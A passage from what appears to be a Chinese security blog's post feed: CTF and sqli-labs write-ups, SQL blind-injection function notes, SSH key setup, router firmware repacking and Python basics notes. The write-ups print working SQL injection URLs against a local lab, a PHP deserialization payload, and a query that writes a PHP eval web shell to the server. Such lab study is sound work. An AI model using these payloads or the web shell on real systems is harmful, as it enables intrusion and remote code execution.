中的第6行使用file_get_contents读取user参数的值，这里必须要用php://input 赋值the user is admin，并不可以利用。第9行限制我们在给file传值时不能含有f1a9，我没有做过原题，可以猜出出题人不想让我们直接读取f1a9xxx的文件，flag应该就在其中。然后在源码的第15行存在include($file)文件包含，第17行unserialize($pass)反序列化函数的参数可控，在第13行执行了echo $pass; class.php源码 中使用了__toString()魔术方法，echo $pass; 会触发__toString()魔术方法，所以存在反序列化漏洞，其中第11行file_get_contents是用来读取$file变量的文件的，并且给出了提示，//f1a9.php； 所以本题的考点就是利用文件包含使用php://input的封装协议传入user参数的值，满足index.php源码中的第6行的条件，在pass参数中传入序列化后要读取的flag文件。 Payload构造1234567891011&lt;?php class Read&#123; public $file; &#125; $payload = new Read();$payload -&gt; file = 'php://filter/read=convert.base64-encode/resource=f1a9.php';echo serialize($payload); 输出：1O:4:&quot;Read&quot;:1:&#123;s:4:&quot;file&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=f1a9.php&quot;;&#125; 最终请求：123GET DATA ：?user=php://input&amp;file=class.php&amp;pass=O:4:&quot;Read&quot;:1:&#123;s:4:&quot;file&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=f1a9.php&quot;;&#125; POST DATA：the user is admin 进行上面的请求，然后得到经过base64编码过的f1a9.php源码，得到flag。]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqli-labs writeup]]></title>
    <url>%2Fsqli-labs-writeup.html</url>
    <content type="text"><![CDATA[sqli-labs writeup less_1-4 加一个’，找到注入点：http://127.0.0.1/Less-1/?id=1&#39; 猜列数：http://127.0.0.1/Less-1/?id=0&#39; order by 4--+ union查询：http://127.0.0.1/Less-1/?id=0&#39; union select 1,2,3--+ 爆库名：http://127.0.0.1/Less-1/?id=0&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata--+ 爆表名：http://127.0.0.1/Less-1/?id=0&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;--+ 爆字段名：http://127.0.0.1/Less-1/?id=0&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;emails&#39;--+ 爆数据：http://127.0.0.1/Less-1/?id=0&#39; union select 1,2,concat_ws(char(32,58,32),id,email_id) from emails--+ less_5-6 爆security表名： http://127.0.0.1/Less-5/?id=1&#39; union select count(*), 1, concat(0x7e,(select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 0,1), 0x7e, floor(rand()*2)) as q from information_schema.tables group by q--+ 爆emails列名：http://127.0.0.1/Less-5/?id=1&#39; union select count(*), 1, concat(0x7e, (select column_name from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x656D61696C73 limit 0, 1), 0x7e, floor(rand()*2)) as q from information_schema.tables group by q--+ Less_7 写文件：http://127.0.0.1/Less-7/?id=1&#39;)) union select 1,2,&#39;&lt;?php @eval($_POST[dayu]);?&gt;&#39; into outfile &#39;/var/www/html/shell.php&#39;--+]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Sql盲注常用函数回顾]]></title>
    <url>%2FSql-blind-basic-function-review.html</url>
    <content type="text"><![CDATA[CONCAT(str1,str2,…)返回来自于参数连结的字符串。如果任何参数是NULL，返回NULL。可以有超过2个的参数。一个数字参数被变换为等价的字符串形式。 ASCII(str)返回字符串str的最左面字符的ASCII代码值。如果str是空字符串，返回0。如果str是NULL，返回NULL。 ORD(str)ORD()函数同ascii()，将字符转为ascii值 SUBSTR(str,pos)就是从pos开始的位置，一直截取到最后。SUBSTR(str,pos,len)pos开始的位置，截取len个字符(空白也算字符)。 mid()截取字符串一部分MID(column_name,start,length)column_name:必需.要提取字符的字段start:必需.规定开始位置（起始值是 1）length:可选.要返回的字符数.如果省略,则 MID() 函数返回剩余文本MID(DATABASE(),1,1)&gt;’a’,查看数据库名第一位，MID(DATABASE(),2,1)查看数据库名第二位，依次查看各位字符MID((sql语句),1,1)&gt;’a’此处column_name参数可以为sql语句，可自行构造sql语句进行注入 LEFT(str,len)返回字符串str的最左面len个字符。 RIGHT(str,len)返回字符串str的最右面len个字符。 ISNULL(expr) 的用法：如expr 为null，那么isnull() 的返回值为 1，否则返回值为 0 IFNULL(expr1,expr2)的用法：假如expr1不为NULL，则IFNULL()的返回值为expr1; 否则其返回值为expr2 NULLIF(expr1,expr2) 的用法：如果expr1=expr2成立，那么返回值为NULL，否则返回值为expr1 regexp正则注入用法介绍：select user() regexp ‘^[a-z]’;Explain：正则表达式的用法，user()结果为root，regexp为匹配root的正则表达式。第二位可以用select user() regexp ‘^ro’来进行。当正确的时候显示结果为1，不正确的时候显示结果为0。]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Sql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[类Unix/Linux系统下使用ssh-keygen设置SSH无密码登录]]></title>
    <url>%2FSSH-Keygen.html</url>
    <content type="text"><![CDATA[.. 一、环境12a机器(Kali)：192.168.43.31b机器(Ubuntu)：192.168.43.30 二、用ssh-keygen创建密钥在kali上执行命令1ssh-keygen -t rsa -t 指定算法 会生成这两个文件其中id_rsa为私钥，放在管理端，id_rsa.pub为公钥，放在被管理端。 三、被管理端配置将公钥文件id_rsa.pub，复制到被管理机器ubuntu下的.ssh目录下（先确保存在这个目录）在ubuntu下执行12345cat id_dsa.pub &gt;&gt; ~/.ssh/authorized_keys设置authorized_keys权限chmod 600 authorized_keys设置.ssh目录权限chmod 700 .ssh 四、连接测试无密码连接成功]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[今天写的三道CTF题的Python脚本]]></title>
    <url>%2FThreeCTFquestionsOnThePythonScript.html</url>
    <content type="text"><![CDATA[0x01 快速口算小明要参加一个高技能比赛，要求每个人都要能够快速口算四则运算，2秒钟之内就能够得到结果，但是小明就是一个小学生没有经过特殊的培训，那小明能否通过快速口算测验呢？题目地址：1http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php 代码：123456789101112131415161718import urllibimport urllib.requestdef main(): url='http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php' req = urllib.request.Request(url) req.add_header("Cookie","PHPSESSID=dc45c388824b53d0bc61b03b153b4813") response = urllib.request.urlopen(req) html = response.read().decode('utf-8') a = html.find('&lt;br/&gt;') b = html.find('=',a) res= eval(html[a+7:b]) params = &#123;'v':res&#125;; params = urllib.parse.urlencode(params).encode('utf-8') response = urllib.request.urlopen(req, params) print (response.read().decode('utf-8'))main() 0x02 百米100米你能跑多快？ 预备，跑！题目地址：1http://ctf5.shiyanbar.com/jia/ 代码：1234567891011121314151617181920import urllibimport urllib.requestdef main(): url='http://ctf5.shiyanbar.com/jia/index.php' req = urllib.request.Request(url) req.add_header("Cookie","PHPSESSID=09jdaa5u9n5u481iujpd56i7u6; Hm_lvt_34d6f7353ab0915a4c582e4516dffbc3=1505970002,1505987900; Hm_lpvt_34d6f7353ab0915a4c582e4516dffbc3=1505991328; Hm_cv_34d6f7353ab0915a4c582e4516dffbc3=1*visitor*80725%2CnickName%3A%E5%A4%A7%E5%AE%87") response = urllib.request.urlopen(req) html = response.read().decode('gbk') a = html.find('my_expr') b = html.find('&lt;/div&gt;',a) str = html[a+9:b-1] str = str.replace("x","*") str = eval(str) params = &#123;'pass_key':str&#125;; params = urllib.parse.urlencode(params).encode('gbk') response = urllib.request.urlopen(req, params) print (response.read().decode('gbk'))main() 0x03 速度爆破看你编程能力怎么样，2秒钟提交应该都会吧。So easy, come on, baby!格式：CTF{}题目地址：1http://ctf5.shiyanbar.com/jia/ 代码：123456789101112131415161718192021222324252627import urllibimport urllib.requestimport hashlibdef main(): url = 'http://ctf5.shiyanbar.com/ppc/sd.php' req = urllib.request.Request(url) req.add_header("Cookie","PHPSESSID=xxxxxxxxxx") response = urllib.request.urlopen(req) html = response.read().decode('utf-8') a = html.find('color:red"&gt;') b = html.find('&lt;/div&gt;',a) res = html[a+11:b] for i in range(1,100001): i = str(i) m = hashlib.md5() m.update(i.encode("utf-8")) fin = m.hexdigest() fin = hashlib.sha1(fin.encode("utf-8")).hexdigest() if(fin == res): params = &#123;'inputNumber': i&#125;; params = urllib.parse.urlencode(params).encode('utf-8') response = urllib.request.urlopen(req, params) print(response.read().decode('utf-8')) breakmain()]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[小tip：trx文件修改-路由器固件的解包打包工具]]></title>
    <url>%2FTrxModify.html</url>
    <content type="text"><![CDATA[在通过ssh或telnet不能修改文件时，可以尝试修改固件重新刷入路由器。 0x01背景今天一个老哥丢给我了一个斐讯K2，已经刷了恩山hiboy的华硕固件，pppoe拨号处密码不能填写特殊字符，但是他的密码有一个特殊字符 而且不能改密码，这就很尴尬了，然后开始了一波探索。。 0x02修改js绕过既然不让提交，试试绕过前端限制把。点应用本页面设置后，会跳到applyRule()这个js。然后找到前端限制问题出在validForm()上。只要不是string就会返回false，那么把这一行删掉不就可以了嘛。ssh连接之找到www目录，里面就有Advanced_WAN_Content.asp这个文件，修改后发现问题。。根本改不了。。chmod winscp一顿尝试后，都无法修改www里面的文件，查了查好像是因为磁盘太小的原因，但是mnt目录可写啊，不知道为什么，反正改不了。。这个以后再研究。看了看路由器感觉这个地方似乎可以，先备份然后改一下备份文件再传回去应该差不多把，发现下载下来的cfg文件记事本打开乱码，放弃之。想想配置的文件会不会在磁盘里，找了找也没有眉目。 0x03trx重新打包固件进入正题。快要放弃的时候想到，能不能改一下包。经过一波搜索，在恩山论坛@yingdaoli的帖子看到了这个软件，在linux下root权限可使用，我发到了微云分享：1https://share.weiyun.com/c3cae319b0bd68c7eb9d23a8a4ac7789 ./modify.sh e rom.trx 是解包解包后不要忘了给squashfs-root文件夹读写权限./modify.sh c newrom.trx 是打包，会自动打包squashfs-root文件夹并且命名为newrom.trx解包后修改Advanced_WAN_Content.asp，重新打包，刷入路由器，成功！没有什么技术含量，但是记录一下这个有趣的过程。]]></content>
      <categories>
        <category>Others</category>
      </categories>
      <tags>
        <tag>路由器</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python基础学习笔记(二)]]></title>
    <url>%2FPythonBasicStudyNotes2.html</url>
    <content type="text"><![CDATA[四、Python异常处理0x01 简介 异常处理就是为了防止程序运行异常时候结束掉了整个程序，比如你访问一个网站，访问不通了，这种情况出现异常导致程序被结束你肯定不希望，所以用try…except..进行捕获异常，对异常进行处理，目的就是不想在异常发生时结束了程序，所以需要在try中捕获。当我们认为某些代码可能会出错时，就可以用try来运行这段代码，如果执行出错，则后续代码不会继续执行，而是直接跳转至错误处理代码，即except语句块， 执行完except后，如果有ﬁnally语句块，则执行ﬁnally语句块。 0x02 格式 12345678910try: fh = open("testfile", "w") fh.write("这是一个测试文件，用于测试异常!!")except IOError: print "Error: 没有找到文件或读取文件失败" else: # 如果try正常执行则执行else，如果发生异常则不执行else print "内容写入文件成功" fh.close() finally: print "不管你有没有找到，都输出我" 0x03 常用操作123456try: &lt;语句&gt; except BaseException,e #前面是异常类型，后面是接受异常信息的变量参数，也可以使用except，然后什么也不加 &lt;发生异常执行语句&gt;except (IOError,KeyError): print sys.exc_info() #虽然能看到错误信息，但不能定位哪里行 如果想知道except接什么的报错类型的话即先让他报错，然后看报的是什么错误，然后再在except后面加上对应的出错的异常类型。备注: 以上方式try-except语句捕获所有发生的异常。但这不是一个很好的方式，我们不能通过该程序识别出具体的异常信息。因为它捕获所有的异常。 同时也不建议使用过多异常处理，虽然程序会减少报错，但如果在开发前报错其实是个好事，如果用太多异常，导致上线产品前会有很多要修改的隐藏bug，只不过可能被 try…except:pass给掩耳盗铃了。 0x04 raise主动抛出异常1234try: rasieException("Invalid level!", level) # 触发异常后，后面的代码就不会再执行 except: print '主动抛出' ps:用户也可以自定义异常，但是要注意捕捉的异常名称要对应自定义的，比如exept “dota wrong”：。 0x05 采用traceback模块查看异常123456import tracebacktry: rasieexcept: traceback.print_exc() #直接屏幕输出错误 traceback.print_exc(file=open('tb.txt','w+')) #错误保存到文件中 0x06 断言assert和if语句类似，是用来检查一个条件，但不同的是如果它为真，就不做任何事。如果它为假，则会抛出AssertError异常。即:123456a = [1,2,3,4]assert 1 in a #不执行任何事情assert 5 in a #抛出AssertionError报错等价于if not 5 in a: rasie AssertionError 用断言的场景:1.断言应该使用在某种情况几乎不会发生的条件下（它是为了确保代码的正确性），目的是为了保证这种小概率事件发生时能尽早终止程序2.异常应该使用在某些问题预见性的会出现，并且你可以创建自己的异常类 五、Python输入输出0x01 print输出123456789101112Example: print 'a=%d,b=%s'%(a,b) #格式化输出 print '%.2f' % a #保留两位小数或者round(a,2) print 'I am &#123;&#125;'.format('dota') #格式化输出print "my name is &#123;name&#125;".format(name=name) print 'I','LOVE','YOU' # print会依次打印每个字符串，遇到逗号“,”会输出一个空格 print 'I', #输出不换行，多加个逗号即可print 'LOVE YOU' 0x02 输入Input()和raw_input() 区别： 查看Input源码发现input也是调用了raw_input，只是做了eval处理 12def input(prompt): return eval(raw_input(prompt)) raw_input：它把所有的输入都直接当作一串字符，于是就可以不用加引号，只保留原始的输入，不作其他（特殊）处理，所以所得到的输入都是字符串 input：会去做额外的处理，比如 1 + 2，其会帮你去计算为3，而不是字符串本身的“1+2”。对应的，想要输入字符串的话，也就要自己加上对应的引号，表示所输入的是字符串类型的值了。因此总的来说一句话就是输入为数字时应该为input，输入字符串时用raw_input 0x03 密码输入1234import getpassuser = getpass.getuser()pwd = getpass.getpass("enter password for user %s: " % user)print user, pwd 0x04 输出重定向123456echo print '\hello\' &gt; dota.py #命令行输出重定向 with open('1.txt','a+') as fr: print &gt;&gt; fr,'dota' # print输出重定向 0x05 遇到print即换行单独输出一个print 和print ‘\n’效果一样 0x06 pprint格式化输出12from pprint import pprintpprint xxxx 六、Python模块0x01 导入模块 [ 模块如果在顶层导入则作用域是全局的，如果在函数中导入是局部的。]123456import module,module2,module3 #正常导入，相当于拿车from module import name,name2,name3 / * #从模块中导入对应的模块属性，相当于从车里拿水，面包等。import requests as visiturl #当导入的模块名字长，你不喜欢或者导入的模块或者模块的属性已经在代码中使用from requests import get as dota 注意点1：不建议from module import *，因为这样有时会污染名称空间，比如导入的模块中的一个函数名跟当前代码中函数名冲突，这样就会被污染；那么为什么import module也是导入全部属性不会被污染呢，因为import module导入后访问属性是通过模块名.属性，从而避免了名称空间冲突。比如：12345678from requests import getdef get(x): x = x+1 print x a=get(2)输出则为3，即先执行了导入语句，但是接下来的函数名冲突覆盖了，导致get属性功能变了。* 注意点2： 一个模块导入只被加载一次，比如你导入了很多次import sys，其次他只执行一次；但是如果你想重新导入一个已经存在的模块，可以使用内置重载函数 reload(sys)123456即:这个模块被重新导入了一次，不过需要注意的是使用reloads时候，前提该模块已经import module过。* 注意点3：如果有特殊情况，在函数中导入相关模块的话，意味着导入的这个模块只适用在当前这个函数的作用域，局部变量。其次意味着只有执行了这个函数才会导入这个模块，否则不会导入。def a(): import requests pass 注意点4：人性化的优雅导入模块，优雅报错。 12345import requeststry: import pymongoexcept: print '您缺少pymongo，请输入pip install pymongo安装。' 注意点5：Python寻找模块的顺序当前进程根目录&gt;pythonpaht环境变量指定路径&gt;python标准库列表&gt;路径文件(.pth）保存的目录。 注意点6：嵌套导入比如我在A中导入了全部B，B中存在的模块即被我导入了，我就可以在A中使用B的模块。 0x02 作用域locals()和globals()分别返回调用者局部和全局名称空间的字典。123456for g in range(1,11): for h in range(1,11): if not(globals()["a%d%d" % (g, h)] == 0): count=count+1ps:["a%d%d" % (g, h)]==0就相当于在&#123;全局变量这个字典中&#125;["agh"] == 0比如：print globals()的全局变量是&#123;'a11':0&#125;，这样他就确定到了a11的value是否是0，判断其是否在全局变量中 0x03 包包就是是一个包含init.py 文件(这个文件定义了包的属性和方法)的目录，该目录下一定得有这个 init.py文件和其它模块或子包,当一个包作为模块导入的时候，实际上导入了它的init.py文件，假如init.py为空，那么仅仅导入包是什么都做不了的。如果采用from package.module import *的话，我们就要在init.py中加入all变量，从而使不同的操作系统在完全导入的时候能自己来取决不同操作系统对应的文件。 0x04 其他sys.path.append() 添加模块路径列表sys.modules 查看所有模块以及路径，返回字典from future import 你希望的新功能 ，虽然可以写 import future 但是没用，因此只能采用 from … import …形式。如果pip安装失败，可以试试apt-get install python-xxxx 七、Python函数0x01 简介函数就是为了方便重复使用相同的一段程序。比如:我们去餐厅吃饭，跟服务员点了菜，过了一会儿，服务员把做好的菜端上来。餐厅的厨房就可以看作是一个函数，我们点的菜单，就是给这个函数的参数；厨师在厨房里做菜的过程就是这个函数的执行过程；做好的菜是返回结果，返回到我们的餐桌上。换个例子函数也就是个你招来的工人。你给他一些材料，告诉他怎么用这些材料拼装，然后他负责把拼装好的成品交给你。 材料就是函数的参数，成品是函数的输出，而怎么拼装就是你写的函数体代码了。 0x02 定义函数1234def dota( parameters ): "函数_文档字符串" function_suite return [expression] 定义函数时，前提确定函数名和参数个数；如果有必要，可以先对参数的数据类型做检查。函数中任何地方的return被执行到的时候，这个函数就会结束，停止执行函数内余下的语句。return并不是必须的，当没有return,或者return后面没有返回值时，函数将自动返回None; return也可以返回多个值，用逗号分隔，相当于返回一个tuple。return语句就是将结果返回到调用的地方，并把程序控制权一起返回。 0x03 常用内置函数1234567891011121314151617181920212223242526272829abs(-1)max([1,2,3])min([1,2,3])round(1)//1.0dir(xx)type(s)callable(funcname) #判断函数是否可调用isinstance(x,list/int) #判断类型cmp('dota','dota') #比较zip()1. zip函数同时遍历两个数组&gt;&gt;&gt; A=[1,2,3]&gt;&gt;&gt; B=[4,5,6]&gt;&gt;&gt; bb=zip(A,B)&lt;zip object at 0x01EF08F0&gt;&gt;&gt;&gt; for i in bb:print(i)(1, 4)(2, 5)(3, 6)&gt;&gt;&gt; for i,v in bb:print(i,v)-----------------------------------2. 通过zip构造字典&gt;&gt;&gt; key=['username','pwd']&gt;&gt;&gt; values=['nini','1qaz']&gt;&gt;&gt; bb=dict(zip(key,values))&gt;&gt;&gt; print(bb)&#123;'pwd': '1qaz', 'username': 'nini'&#125; 0x04 函数参数 关键字参数调用时指定参数的名称，且与函数声明时的参数名称一致。使用关键字参数允许函数调用时参数的顺序与声明时不一致，仅根据参数的指定进行赋值。 123456def foo(x, y):print 'x is %s' % xprint 'y is %s' % yif __name__ == '__main__': foo(1, 2) # 标准调用 foo(y = 1, x = 2) # 关键字调用 默认参数在函数声明时，指定形参的默认值，调用时可不传入改参数（使用默认值)。为什么需要默认参数，比如程序员遇到刚拿到的api接口传入的参数不太确定时候就可以使用默认参数，默认参数就像安装软件那样，很多情况你对这个软件功能不太明白情况下都是采用默认安装。 12345def tax(cost, rate = 0.17): print cost * (1 + rate) if __name__ == '__main__': tax(1000) # rate使用默认值0.17 tax(1000, 0.05) # rate指定为0.05 非关键字可变长参数（元组）F(arg1)上面俩个方式是有多少个形参，就传进去多少个实参，但有时候会不确定有多少个参数，则此时第三种方式就比较有用，它以一个加上形参名的方式来表示这个函数的实参个数不定，可能为0个也可能为n个。注意一点是，不管有多少个，在函数内部都被存放在以形参名为标识符的元组中。 1234567891011121314def a(*x): if len(x) == 0: print 'None' else: print x&gt;&gt;&gt;a(1)(1,) #存放在元组中&gt;&gt;&gt;a(1,2,3)(1,2,3)&gt;&gt;&gt; a(m=1,y=2,z=3)Traceback (most recent call last):File "&lt;pyshell#16&gt;", line 1, in -toplevela(m=1,y=2,z=3)TypeError: a() got an unexpected keyword argument 'm' 关键字可变长参数（字典） F(*arg1) 形参名前加俩个表示，参数在函数内部将被存放在以形式名为标识符的字典中，这时调用函数的方法则需要采用arg1=value1,arg2=value2这样的形式。 123456789def a(**x):if len(x) ==0:print 'None'else:print x&gt;&gt;&gt;&gt; a()None&gt;&gt;&gt; a(x=1,y=2)&#123;'y':2,'x':'1'&#125; 各种参数调用的顺序 12def dota(a,b=1,*c,**d): pass 向函数中传入元组和字典对象 1newfoo(2, 4, *(6, 8), **&#123;'foo': 10, 'bar': 12&#125;) 0x05 函数对象 vs 函数调用无论是把函数赋值给新的标识符，还是作为参数传递给新的函数，针对的都是函数对象本身，而不是函数的调用。用一个更加简单，但从外观上看，更容易产生混淆的例子来说明这个问题。例如定义了下面这个函数：12345678910111213def func():return "hello,world"ref1 = func #将函数对象赋值给ref1ref2 = func() #调用函数，函数的返回值赋值给ref1type(ref1)functiontype(ref2)str通过内建的callable函数，可以进一步验证ref1是可调用的，而ref2是不可调用的,callable(ref1)Truecallable(ref2)False 0x06 内嵌函数123456def dota1(): print 'do dota1' def dota2(): print 'do dota2' dota2()f = dota1() 0x07 闭包要形成闭包，首先得有一个嵌套的函数，即函数中定义了另一个函数，闭包则是一个集合，它包括了外部函数的局部变量，这些局部变量在外部函数返回后也继续存在，并能被内部函数引用。123456def dota1(x): def dota2(y): return x+y return dota2dota = dota1(1)(2)print dota]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python基础学习笔记(一)]]></title>
    <url>%2FPythonBasicStudyNotes1.html</url>
    <content type="text"><![CDATA[一、Python基础0x01 运行机制 python解释型语言，因此在运行时解释器将源码转换为字节码，然后再由解释器来执行这些字节码。虚拟机执行脚本:1.完成模块的加载和链接；2.将源代码翻译为PyCodeObject对象（这货就是字节码），并将其写入内存当中（方便CPU读取，起到加速程序运行的作用）；3.从上述内存空间中读取指令并执行；4. 程序结束后，根据命令行调用情况（即运行程序的方式）决定是否将PyCodeObject写回硬盘当中（也就是 直接复制到.pyc或.pyo文件中）；5.之后若再次执行该脚本，则先检查本地是否有上述字节码文件。有则执行，否则重复上述步骤。 0x02 !/usr/bin/env python 和 #!/usr/bin/python #! /usr/bin/env python是防止用户没有把python安装在默认路径，它执行过程就是先到env设置中查找 python路径，然后调出对应解释器。而/usr/bin/python就是固定死了python的路径。一般推荐#!/usr/bin/env python 然后保存好之后在目录下chmod a+x hello.py，然后直接就可以运行啦。 其次加不加这个头有一个明显区别，如果加了这个头，运行xxx.py可以切到目录下直接./xx.py，如果没有加 这个头则需要python ./xxx.py 0x03 if name == ‘main’: 的解析 首先 if name==“main“ :是 程序的入口。 在python中，当一个module作为整体被执行时, moduel.name 的值将是 ”main” ；而当 一个module被其它module引用时， module.name 将是module自己的名字，当然一个module被 其它module引用时，其本身并不需要一个可执行的入口main了。可以说python中的这种用法很灵活 啊。（用于判断是不是本身执行的还是被别人导入的，如果是别人导入的话就执行就起到函数调用作 用，不会执行导入模块，这样好处就是我导入了你，但是我不想要你的输出，我只想要你模块里面部分 内容。如果不这样我导入了你你还输出显示我不想要的内容。） 用来检测该文件代码是否是主程序文件，也即非模块。从而可以避免执行不必要代码。123456789#代码1 def run(): print "test is running"if __name__ == "__main__": print "test main is working"#代码2：import untitledif __name__=="__main__": untitled.run() 如果是代码1单独运行的话下面的print会输出，但是如果被代码2导入的话，他只执行函数体，不执行if name 下面的。是用来检测该文件代码是否是主程序文件，也即非模块 最简单理解这个问题就是 print name ,如果是直接执行，那么 name 的值就是 main 。如果是被调用的执行的话，则值是被调用的那个脚本的名称。 0x04 其他 当语句以：结尾时，缩进的语句视为代码块。缩进有利有弊。好处是强迫你写出格式化的代码，但没有规定缩进是几个空格还是Tab。按照约定俗成的管理，应该始终坚持使用4个空格的缩进。缩进的另一个好处是强迫你写出缩进较少的代码，你会倾向于把一段很长的代码拆分成若干函数，从而得到缩进较少的代码。 Python程序是大小写敏感的，如果写错了大小写，程序会报错。 Python中的变量不需要声明，可以直接输入：a=10;那么你的内存里就有了一个变量a， 它的值是10， 它的类型是integer (整数)。 在此之前你不需要做什么特别的声明，而数据类型是Python自动决定的。 二、Python数据类型0x01 列表 简介列表就是可变的数组，之所以是可变的是因为随随便便就可以增加和减少操作。形式如下:list = []。 访 问列表主要是索引和切片，索引从左到右第一个是0，从右到左第一个是-1；切片包含起始的数字，但 不包含末尾的数字。 123456Example:(访问列表两种方式，单个元素访问通常下标，多个元素访问通常切片。) list=[1,2,9,4] print list[0],list[1:3] print list[::-1] 步长切片Result: 1 [2,9] [4，9，2，1] 追加 12345678910111213141516171819Example1:（单一追加） dota=[1,2,3] dota.append(9) print dota Result: [1,2,3,9] Example2: (列表和列表之间追加) dota1=[1,2,3] dota2=[4,5,6] dota1.extend(dota2) Result: [1,2,3,4,5,6]Example3: (+连接，*重复) dota1 = [1,2,3,4] dota2 = [3,4] dota3 = dota1+dota2 dota4 = dota2*2 print dota3,dota4Result: [1,2,3,4,3,4] [3,4,3,4] 插入指定位置 12345Example: dota=[1,2,3] dota.insert(2,9) print dota Result: [1,2,9,3] 删除列表元素 1234567891011121314151617181920Example1:（删除末尾元素） dota=[1,2,3] dota.pop() print dotaResult: [1,2] Example2:（删除指定位置的元素） dota=[1,2,3] dota.pop(0) print dotaResult: [2,3] Example3:（del通过下标删除序列元素） dota=[1,2,3] del dota[0] print dota Result: [2,3] Example4: (remove删除指定元素,ps用于移除列表中某个值的第一个匹配项) dota=[1,3,4,5,6,4] dota.remove(4)Result:dota[1,3,5,6,4] 统计列表元素 12345Example:(统计列表中元素出现的次数) dota=[1,2,3,4,4,4,4,4] num=dota.count(4) print num Result: 5 查找元素返回其第一次出现的下标 12345Example: dota = [1,1,2,3,2] num=dota.index(2) print num Result: 2 列表其他技巧 123456789101112Example1:列表嵌套列表，形成二维数组 s = ['python', 'java', ['asp', 'php'], 'scheme'] s[2][1] Result: php Example2:列表中数据类型可以混杂 s = ['python',1，True] Example3:其他数据类型转换成列表(也可以说是列表的其他写法) d=list('abcd') print d,type(d) Result: ['a', 'b', 'c', 'd'] &lt;type 'list'&gt; 0x02 元组 简介元组是不可变数组，因此当定义一个tuple时候它的元素就必须被确定下来，不能改变；list和tuple区别 主要表现在list可以变能给下标赋值修改，而tuple不能；因此tuple不可变代码更安全，如果可能，能用 tuple代替list就尽量用tuple,比如你写了一个API，然后要交给别人来对接，但是你想保证你的代码的安 全以及不想让别人动你的代码，此时tuple就是相对合适的选择。 查找元素返回其第一次出现的下标 12345Example: dota = (1,1,2,3,2) num=dota.index(2) print numResult: 2 统计元组中元素出现的次数 12345Example: dota=(1,2,3,4,4,4,4,4) num=dota.count(4) print num Result: 5 元组其他技巧 123456789Example1: 其他类型转换成元组 a=[1,2,3,4] b=tuple(a) print b Result: (1,2,3,4) Example2: 区别点 a= (4) 类型type(a)是int a=(4,) 类型type(a)是tuple 0x03 字典 简介格式如下:d = {key1 : value1, key2 : value2 } 方法.keys()返回字典所有键的列表，.items()返回字典所有值的列表。12345678910111213141516171819常用方法: Example1：访问元素 a=&#123;'1':'dota','2':'dota2'&#125; a['1'] Result:‘dota’ Example2: a=&#123;'1':'dota','2':'dota2'&#125; a[a.keys()[0]] Result：dota Example3: a.items显示所有元素 for k，v in d.iteritems():迭代列生成 print k ,v Example4: dict(zip(‘abc’,range(2)))字典生成 &#123;k:v for k,v in zip(“abc”,range(3))&#125;生成字典 三、Python文件操作0x01 读文件123456+ 文本模式【r ASCll编码】 with open('password.txt','r') as f： #使用这种方式打开文件，不用考虑close() print f.read() #一次读取所有内容，返回str（在列知道文件大小下别随便用，万一大于自己内存的大小直接爆） print f.read(1) #读取第一个字符 print f.readline() #读取每行内容 print f.readlines() #一次读取所有行内容，返回list 123456789+ 二进制模式 【rb 图片，视频等】 with open('mm.jpg','rb') as fr: fr.read() Result:'\xff\xd8\xff\xe1\x00\x18Exif\x00\x00...'ps：如果读取非ascll编码文件，就必须用二进制模式打开，然后再解码，但是解码会很麻烦，因此可以使用codecsimport codecs with codecs.open('mm.jpg'.'rb','gbk') as fr: fr.read() Result:u'\u6d4b\u8bd5' 0x02 写文件12with open("password.txt",'w') as fw: fw.write('Dota') #注意每次写会覆盖掉前一次。 0x03 其他读写方式r 只读不可写（默认如果不写就是r）w 只写（如果用w会把之前内容清空掉）a 追加（自动添加在文件的末尾）r+ 可读可写，若文件不存在，报错w+ 可读可写，若文件不存在，创建12345678对文件读写操作优雅写法try: with open('password.txt','r') as fr,open('save.txt','w') as fw： for line in fr: fw.write(line.lstrip('/')) fw.flush() except IOError, e: pass 1234对文件的读取并且自动去换行优雅写法 with open('1.txt','r') as fr: data = [line.strip() for line in fr.readlines()] print data 123456789减压读取文件优雅写法with open(&apos;1.txt&apos;,&apos;r&apos;) as fr: for i in fr: print i with open(&apos;1.txt&apos;,&apos;r&apos;)as fr: for i in fr.readlines(): print i #虽然都能读取文件，但是当文件数量大的时候第一种明显不合适。 12345同时读取多个文件 with open(filename1) as fp1, open(filename2) as fp2, open(filename3) as fp3: for l1 in fp1: l2 = fp2.readline() l3 = fp3.readline() 0x04 备注 结尾换行标志(通过os.linesep获取当前系统换行标志) Linux \n Mac \r Windows \r\n 文件使用完毕后必须关闭，因为文件对象会占用操作系统的资源，并且操作系统同一时间能打开的文件 数量也 是有限的，由于文件读写时都有可能产生IOError，一旦出错，后面的f.close()就不会调用。所 以，为了保证无论是否出错都能正确地关闭文件，我们可以使用try … ﬁnally来实现,但是这样不够优 美，因此用with…as方式最合适。 readline和readlines如果不对每一行空白字符做处理，然后print输出的话，每一行输出的末尾会有两个换行，一个是读取附带的，还一个是print带的，因为print自带一个换行，如果不希望print带换行，则输出的时候末尾加个逗号。 fr.name 输出当前文件名 fr.ﬂush() 刷新 fw.truncate() 清空文件]]></content>
      <categories>
